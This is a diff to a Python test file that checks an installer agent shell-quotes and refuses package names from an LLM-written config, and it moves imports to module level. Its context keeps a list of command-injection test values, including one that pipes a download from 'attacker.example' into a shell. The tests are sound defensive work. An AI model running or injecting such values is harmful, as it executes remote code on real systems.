@@ -1,3 +1,4 @@
+# SPDX-License-Identifier: Apache-2.0
 """A "package" must be a package name, not an instruction to pip or a shell.
 
 Two exposures, one answer. Locally the command is built as a *list*, so there
@@ -13,6 +14,9 @@ still an option. The allow-list is what handles the first.
 The names arrive in a spawn config an LLM wrote, from a request a user phrased.
 """
 
+import asyncio
+import shlex
+from pathlib import Path
 from typing import Any
 
 import pytest
@@ -144,7 +148,6 @@ class TestValuesHandedToTheRemoteShell:
         ["x; curl attacker.example|sh", "x && id", "$(id)", "`id`", "x | tee /tmp/x", "a b"],
     )
     def test_quoting_makes_a_hostile_value_one_argument(self, hostile: str) -> None:
-        import shlex
 
         quoted = shlex.quote(hostile)
 
@@ -164,7 +167,6 @@ class TestValuesHandedToTheRemoteShell:
     def test_both_call_sites_quote_their_values(self) -> None:
         # The pattern and the launch command are built in two places; a fix to
         # one and not the other leaves the hole open.
-        from pathlib import Path
 
         source = Path("wactorz/agents/installer_agent.py").read_text(encoding="utf-8")
 
@@ -242,7 +244,6 @@ def _record_exec(monkeypatch: pytest.MonkeyPatch) -> list[tuple[Any, ...]]:
     happened" is satisfied by an install that went through the shell instead —
     which is the defect these tests exist for, passing itself off as the fix.
     """
-    import asyncio as _asyncio
 
     calls: list[tuple[Any, ...]] = []
 
@@ -260,8 +261,8 @@ def _record_exec(monkeypatch: pytest.MonkeyPatch) -> list[tuple[Any, ...]]:
     async def _no_shell(*args: Any, **_kw: Any) -> Any:
         raise AssertionError(f"the runner must not install through a shell: {args!r}")
 
-    monkeypatch.setattr(_asyncio, "create_subprocess_exec", _fake_exec)
-    monkeypatch.setattr(_asyncio, "create_subprocess_shell", _no_shell)
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", _fake_exec)
+    monkeypatch.setattr(asyncio, "create_subprocess_shell", _no_shell)
     return calls
 
 
@@ -309,13 +310,12 @@ def _spawn_runner(monkeypatch: pytest.MonkeyPatch) -> Any:
     Any attempt to install raises: on a refusal nothing may be handed to pip,
     by either subprocess route.
     """
-    import asyncio as _asyncio
 
     async def _explode(*args: Any, **_kw: Any) -> Any:
         raise AssertionError(f"a refused install list reached pip: {args!r}")
 
-    monkeypatch.setattr(_asyncio, "create_subprocess_exec", _explode)
-    monkeypatch.setattr(_asyncio, "create_subprocess_shell", _explode)
+    monkeypatch.setattr(asyncio, "create_subprocess_exec", _explode)
+    monkeypatch.setattr(asyncio, "create_subprocess_shell", _explode)
 
     runner = _runner()
     runner.registry = ActorRegistry()
